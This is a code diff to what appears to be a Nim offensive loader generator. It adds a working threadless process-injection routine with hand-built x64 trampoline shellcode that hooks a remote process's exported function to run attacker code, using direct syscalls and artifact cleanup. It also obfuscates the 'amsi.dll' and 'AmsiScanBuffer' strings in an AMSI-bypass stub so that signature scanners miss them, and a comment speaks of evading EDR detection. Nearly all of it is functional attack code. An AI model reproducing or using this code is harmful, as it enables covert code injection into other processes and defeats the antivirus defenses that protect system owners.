@@ -32,6 +32,283 @@ var buffers: HookTrampolineBuffers
 
 """
 
+let ThreadlessInjectStub * = """
+
+proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress: LPVOID): bool =
+    var 
+        trampolineStk: array[75, byte]
+        trampSize: DWORD
+        highBytePatched: DWORD64
+        lowBytePatched: DWORD64
+        szOutput: SIZE_T
+        status: NTSTATUS
+        pageToProtect: PVOID
+        pageSize: SIZE_T
+        oldProtect: DWORD
+        ntStatus: NTSTATUS
+        tmp: DWORD64
+        trampolineAddress: PVOID
+        trampolineSize: SIZE_T
+        shellcode: PBYTE
+        shellcodeStk: array[12, byte]
+        checkArray: array[12, byte]
+        exportContent: LPVOID
+        hookCalled: DWORD
+
+
+    
+    trampolineStk = [byte 0x58,                                     # pop RAX
+    0x48, 0x83, 0xe8, 0x0c,                                         # sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
+    0x50,                                                           # push RAX
+    0x55,                                                           # PUSH RBP
+    0x48, 0x89, 0xE5,                                               # MOV RBP, RSP
+    0x48, 0x83, 0xec, 0x08,                                         # SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
+    0x51,                                                           # push RCX                         : just save the context registers
+    0x52,                                                           # push RDX
+    0x41, 0x50,                                                     # push R8
+    0x41, 0x51,                                                     # push R9
+    0x41, 0x52,                                                     # push R10
+    0x41, 0x53,                                                     # push R11
+    0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RCX, 0x0000000000000000   : restore the hooked function code
+    0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RDX, 0x0000000000000000   : restore the hooked function code
+    0x48, 0x89, 0x08,                                               # mov qword ptr[rax], rcx          : restore the hooked function code
+    0x48, 0x89, 0x50, 0x08,                                         # mov qword ptr[rax+0x8], rdx      : restore the hooked function code
+    0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
+    0xff, 0xd0,                                                     # call RAX                         : Call the malicious code
+    0x41, 0x5b,                                                     # pop R11                          : Restore the context
+    0x41, 0x5a,                                                     # pop R10
+    0x41, 0x59,                                                     # pop R9
+    0x41, 0x58,                                                     # pop R8
+    0x5a,                                                           # pop RDX
+    0x59,                                                           # pop RCX
+    0xc9,                                                           # leave
+    0xc3                                                            # ret   
+    ]
+    trampSize = 75
+
+    highBytePatched = 0
+    lowBytePatched = 0
+    szOutput = 0
+
+    # Save the instruction of the hooked function
+    # It is mandatory to save this information in order to be able
+    # to restore the hook once the execution finished
+    when defined(verbose):
+        echo obf("[+] Saving the instruction of the hooked function: "), repr(exportAddress)
+    
+    when defined(Hellsgate):
+        if getSyscall(ntReadTable):
+            syscall = ntReadTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to find opcode for NtReadVirtualMemory")
+            return false
+    status = NtReadVirtualMemory(processHandle, exportAddress, &highBytePatched, sizeof(DWORD64), &szOutput)
+    if (status == 0):
+        when defined(verbose):
+            echo obf("[+] Read memory success "), repr(exportAddress)
+    var readLowPointer: PVOID = cast[PVOID]((cast[DWORD64](exportAddress) + sizeof(DWORD64)))
+    status = NtReadVirtualMemory(processHandle, readLowPointer, &lowBytePatched, sizeof(DWORD64), &szOutput)
+    if (status == 0):
+        when defined(verbose):
+            echo obf("[+] Read memory success "), repr(readLowPointer)
+    pageToProtect = exportAddress
+
+    pageSize = 2 * sizeof(DWORD64)
+
+    when defined(Hellsgate):
+        if getSyscall(ntProtectTable):
+            syscall = ntProtectTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            return false
+
+    status = NtProtectVirtualMemory(processHandle, &pageToProtect, &pageSize, PAGE_EXECUTE_READWRITE, &oldProtect)
+    if (status == 0):
+        when defined(verbose):
+            echo obf("[+] Protect memory success, "), repr(pageToProtect)
+
+    tmp = highBytePatched
+
+    # Replace the place holders in the trampoline shellcode
+    # with the righ values
+    moveMemory(unsafeAddr trampolineStk[26], &highBytePatched, sizeof(DWORD64))
+    moveMemory(unsafeAddr trampolineStk[36], &lowBytePatched, sizeof(DWORD64))
+    moveMemory(unsafeAddr trampolineStk[53], unsafeAddr jumpAddress, sizeof(DWORD64))
+    # Write the trampoline somewhere in memory
+    # Here VirtualAlloc is used, but some code cave can be used to limit this call
+    # As the trampoline size is lesser than 4Ko, we should be ok for EDR detections
+    trampolineAddress = nil
+    trampolineSize = trampSize * sizeof(byte)
+
+    when defined(Hellsgate):
+        if getSyscall(ntAllocTable):
+            syscall = ntAllocTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+            return false
+
+    status = NtAllocateVirtualMemory(processHandle, &trampolineAddress, 0, &trampolineSize, MEM_COMMIT, PAGE_READWRITE)
+    if (status == 0):
+        when defined(verbose):
+            echo obf("[+] Allocate memory success "), repr(trampolineAddress) 
+    
+    when defined(Hellsgate):
+        if getSyscall(ntWriteTable):
+            syscall = ntWriteTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            return false
+    
+    status = NtWriteVirtualMemory(processHandle, trampolineAddress, unsafeAddr trampolineStk[0], trampSize, &szOutput)
+    if (status == 0):
+        when defined(verbose):
+            echo obf("[+] Write memory success "), repr(trampolineAddress)
+    
+    when defined(Hellsgate):
+        if getSyscall(ntProtectTable):
+            syscall = ntProtectTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            return false
+    
+    status = NtProtectVirtualMemory(processHandle, &trampolineAddress, &trampolineSize, PAGE_EXECUTE_READ, cast[PDWORD](&szOutput))
+    if (status == 0):
+        when defined(verbose):
+            echo obf("[+] Protect memory success "), repr(trampolineAddress)
+    when defined(verbose):
+        echo obf("[+] Hook shellcode written at : "), repr(trampolineAddress)
+
+    # Create the hook that will be placed in the remote function
+
+    shellcodeStk = [byte 0x48, 0xB8, # mov RAX, 0x0000000000000000
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xFF, 0xD0 # Call RAX
+    ]
+    moveMemory(unsafeAddr shellcodeStk[2], unsafeAddr trampolineAddress, sizeof(DWORD64))
+    # Replace the place holder
+    
+    when defined(Hellsgate):
+        if getSyscall(ntWriteTable):
+            syscall = ntWriteTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            return false
+
+    status = NtWriteVirtualMemory(processHandle, exportAddress, unsafeAddr shellcodeStk[0], 12 * sizeof(byte), &szOutput)
+    if (status == 0):
+        when defined(verbose):
+            echo obf("[+] Write memory for the hook success")
+    exportContent = nil
+    hookCalled = 0
+
+    when defined(localinject): # we can manually trigger the hook
+        # fake type definition for ThreadlessFunc to call the function for triggering the threadless thread
+        type ThreadlessFunc = proc (hProcess: HANDLE, lpBaseAddress: LPVOID, lpStartAddress: LPVOID): bool {.stdcall.}
+        var ThreadlessFuncPtr: ThreadlessFunc = cast[ThreadlessFunc](exportAddress)
+        when defined(verbose):
+            echo obf("[*] Calling threadlessFunction")
+        var threadlessFuncSuccess: bool = ThreadlessFuncPtr(-1, nil, nil)
+
+    while (hookCalled == 0):
+        when defined(verbose):
+            echo obf("[-] Waiting 10 seconds for the hook to be called...")
+        Sleep(10000)
+        # Check if the hook has been re-patched ie has been successfully executed
+        when defined(verbose):
+            echo obf("[+] Checking if the hook has been called, "), repr(exportAddress)
+
+        when defined(Hellsgate):
+            if getSyscall(ntReadTable):
+                syscall = ntReadTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtReadVirtualMemory")
+                return false
+        status = NtReadVirtualMemory(processHandle, exportAddress, unsafeAddr checkArray[0], cast[SIZE_T](12 * sizeof(byte)), &szOutput)
+        if (status == 0):
+            when defined(verbose):
+                echo obf("[+] Read memory for the hook success")
+        else:
+            when defined(verbose):
+                echo obf("[-] Read memory for the hook failed")
+            echo toHex(status)
+        hookCalled = cast[DWORD](cmpMem(unsafeAddr shellcodeStk[0], unsafeAddr checkArray[0], 12 * sizeof(byte)))
+        if(hookCalled == 0):
+            when defined(verbose):
+                echo obf("[*] Hook not called yet...")
+
+    # Just remove all artifacts in memory
+    when defined(verbose):
+        echo obf("[+] Hook called ! Releasing artifacts")
+    
+    var freeAddress: LPVOID = trampolineAddress
+    # Re-Protect Shellcode to RW for freeing
+    when defined(Hellsgate):
+        if getSyscall(ntProtectTable):
+            syscall = ntProtectTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            return false
+    status = NtProtectVirtualMemory(processHandle, &freeAddress, &trampolineSize, PAGE_READWRITE, &oldProtect)
+    #Sleep(500)
+
+    when defined(Hellsgate):
+        if getSyscall(ntFreeTable):
+            syscall = ntFreeTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to find opcode for NtFreeVirtualMemory")
+            return false
+    
+    status = NtFreeVirtualMemory(processHandle, &trampolineAddress, nil, MEM_DECOMMIT or MEM_RELEASE) # fails for some reason with access denied
+
+    if(status == 0):
+        when defined(verbose):
+            echo obf("[+] Free memory success "), repr(trampolineAddress)
+    else:
+        when defined(verbose):
+            echo obf("[-] Free memory failed "), repr(trampolineAddress)
+        echo toHex(status)
+    #[
+    var FreeSuccess = VirtualFreeEx(processHandle, &trampolineAddress, 0, MEM_RELEASE or MEM_DECOMMIT)
+
+    if(FreeSuccess):
+        when defined(verbose):
+            echo obf("[+] Free memory success "), repr(trampolineAddress)
+    else:
+        when defined(verbose):
+            echo obf("[-] Free memory failed "), repr(trampolineAddress)
+    ]#
+
+    when defined(Hellsgate):
+        if getSyscall(ntProtectTable):
+            syscall = ntProtectTable.wSysCall
+        else:
+            when defined(verbose):
+                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            return false
+    status = NtProtectVirtualMemory(processHandle, &pageToProtect, &pageSize, oldProtect, &oldProtect)
+
+    if (status == 0):
+        when defined(verbose):
+            echo obf("[+] Protect memory success")
+    else:
+        when defined(verbose):
+            echo obf("[-] Protect memory failed")
+        echo toHex(status)
+
+    return true
+
+
+"""
+
 let CustomThreadEntryStubSecond * = """
 
     proc fastTrampoline(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers): bool =
@@ -1457,17 +1734,18 @@ let AmsiStub * = """
         threadCtx.ContextFlags = CONTEXT_ALL
 
         # Load amsi.dll if it hasn't be loaded alreay.
+        var split: string = obf("si.dll")
         if g_amsiScanBufferPtr == nil:
             when defined(DInvoke):
-                var amsi = MyGetModuleHandleA(obf("amsi.dll"))
+                var amsi = MyGetModuleHandleA(obf("am")&split)
             else:
-                var amsi = GetModuleHandleA(obf("amsi.dll"))
+                var amsi = GetModuleHandleA(obf("am")&split)
             
             var ModuleFileName: UNICODE_STRING
             when defined(DInvoke):
-                MyRtlInitUnicodeString(addr(ModuleFileName), obf("amsi.dll"))
+                MyRtlInitUnicodeString(addr(ModuleFileName), obf("am")&split)
             else:
-                RtlInitUnicodeString(addr(ModuleFileName), obf("amsi.dll"))
+                RtlInitUnicodeString(addr(ModuleFileName), obf("am")&split)
             
             when defined(DInvoke):
                 var dllstatus = MyLdrLoadDll(nil, 0, &ModuleFileName, &amsi)
@@ -1481,12 +1759,12 @@ let AmsiStub * = """
             else:
                 when defined(verbose):
                     echo obf("[+] Loaded: amsi.dll")
-
+            var splitString: string = obf("ScanBuffer")
             if amsi != 0:
                 when defined(DInvoke):
-                    g_amsiScanBufferPtr = cast[PVOID](MyGetProcAddress(amsi, obf("AmsiScanBuffer")))
+                    g_amsiScanBufferPtr = cast[PVOID](MyGetProcAddress(amsi, obf("Amsi")&splitString))
                 else:
-                    g_amsiScanBufferPtr = cast[PVOID](GetProcAddress(amsi, obf("AmsiScanBuffer")))
+                    g_amsiScanBufferPtr = cast[PVOID](GetProcAddress(amsi, obf("Amsi")&splitString))
 
             if g_amsiScanBufferPtr == nil:
                 when defined(verbose):
